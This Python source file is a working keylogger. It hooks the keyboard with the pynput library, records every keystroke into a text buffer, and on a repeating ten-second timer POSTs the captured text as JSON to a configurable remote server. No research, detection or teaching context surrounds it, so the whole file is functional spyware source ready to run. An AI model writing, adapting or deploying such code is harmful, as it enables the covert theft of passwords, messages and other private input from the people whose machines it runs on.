import json
import threading

import requests
from icecream import ic
from pynput import keyboard

# Initialize an empty string to store captured text
text = ""

# Server IP address and port number
ip_address = "0.0.0.0"
port_number = "8080"
# Time interval in seconds to send captured data to the server
time_interval = 10

# Function to send a POST request with the captured keyboard data
def send_post_request():
    try:
        # Prepare the payload with the captured text
        payload = json.dumps({"keyboard_data": text})
        # Send the POST request to the server
        requests.post(
            f"http://{ip_address}:{port_number}",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        # Set a timer to call this function again after the specified interval
        timer = threading.Timer(time_interval, send_post_request)
        timer.start()
    except requests.exceptions.RequestException as e:
        # Log network-related errors
        ic(f"Network-related error occurred: {e}")
    except json.JSONDecodeError as e:
        # Log JSON encoding errors
        ic(f"JSON encoding error: {e}")
    except Exception as e:
        # Log any other unexpected errors
        ic(f"An unexpected error occurred: {e}")

# Function to handle key press events
def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        # Stop the listener if the Esc key is pressed
        return False
    else:
        # Append the pressed key to the text
        text += str(key).strip("'")

# Start the keyboard listener and the periodic POST request
with keyboard.Listener(on_press=on_press) as listener:
    send_post_request()
    listener.join()